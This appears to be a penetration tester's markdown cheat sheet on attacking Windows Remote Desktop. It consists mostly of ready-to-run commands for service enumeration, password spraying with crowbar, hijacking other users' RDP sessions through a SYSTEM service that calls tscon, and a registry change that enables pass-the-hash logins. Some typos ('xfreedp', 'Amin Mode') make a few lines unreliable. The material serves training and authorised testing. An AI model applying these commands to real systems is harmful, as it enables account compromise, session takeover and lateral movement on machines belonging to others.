 - Footprinting the Service
```bash
sudo nmap -sV -sC $IP -p3389 --script rdp*
```

- To track individual packages
```bash
sudo nmap -sV -sC $IP -p3390 --script rdp* --packet-trace --disable-arp-ping
```

### RDP Security Check
```bash
# Installation
sudo cpan
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
./rdp-sec-check.pl $IP

# Initiate an RDP Session
xfreedp /u:$user /p:$pass /b:$IP
```

### Password spraying using crowbar
```bash
crowbar -b rdp -s $IP -U users.txt -c 'password123'
```

### RDP Session Hijack
- Retrieve logged in users on the machine
```PowerShell
query user
```

- To successfully impersonate a user without password, we need SYSTEM privileges and use `tscon.exe`
```cmd
tscon $TARGET_SESSION /dest:$OUR_SESSION_NAME
```

- If we have local administrator privileges, we can obtain SYSTEM privilege by using `PsExec` or `Mimikatz`.
	1. Create a Windows service that will run as Local System and will execute binary with SYSTEM privileges.
	```cmd
			sc.exe create sessionhijack binpath= "cmd.exe /k tscon 1 /dest:$OUR_SESSION_NAME"
	```
	2. Start the service
	```cmd
	net start sessionhijack
	```

***NOTE:*** This no longer works on server 2019

### RDP Pass-the-Hash (PtH)
- We can use `xfreerdp` to access the target machine using obtain hashes.
- Prerequisites: The target must have `Restricted Amin Mode` enabled.
```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```